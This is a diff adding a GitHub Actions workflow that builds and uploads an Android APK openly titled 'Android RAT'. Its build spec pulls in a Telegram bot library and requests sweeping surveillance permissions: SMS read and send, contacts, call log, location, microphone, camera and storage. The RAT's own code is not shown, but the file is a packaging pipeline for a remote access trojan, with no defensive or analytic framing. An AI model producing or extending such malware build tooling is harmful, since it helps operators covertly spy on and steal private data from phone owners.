@@ -1,1 +1,58 @@
+name: Build APK
 
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: actions/checkout@v3
+    
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+    
+    - name: Install Buildozer
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y build-essential libffi-dev libssl-dev zlib1g-dev liblzma-dev libbz2-dev libreadline-dev libsqlite3-dev libncurses5-dev libncursesw5-dev xz-utils tk-dev git zip unzip openjdk-17-jdk
+        pip install buildozer cython
+    
+    - name: Create buildozer.spec
+      run: |
+        cat > buildozer.spec << 'EOF'
+        [app]
+        title = Android RAT
+        package.name = androidrat
+        package.domain = org.rat
+        source.dir = .
+        source.include_exts = py
+        version = 0.1
+        requirements = python3,python-telegram-bot
+        orientation = portrait
+        fullscreen = 0
+        android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_SMS,SEND_SMS,READ_CONTACTS,READ_CALL_LOG,READ_PHONE_STATE,RECORD_AUDIO,CAMERA,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,FOREGROUND_SERVICE
+        android.api = 33
+        android.minapi = 21
+        android.archs = arm64-v8a
+        android.entrypoint = org.kivy.android.PythonActivity
+        android.private_storage = True
+        android.presplash_color = #000000
+        
+        [buildozer]
+        log_level = 2
+        warn_on_root = 1
+        EOF
+    
+    - name: Build APK
+      run: |
+        buildozer android debug
+    
+    - name: Upload APK
+      uses: actions/upload-artifact@v3
+      with:
+        name: android-rat-apk
+        path: bin/*.apk
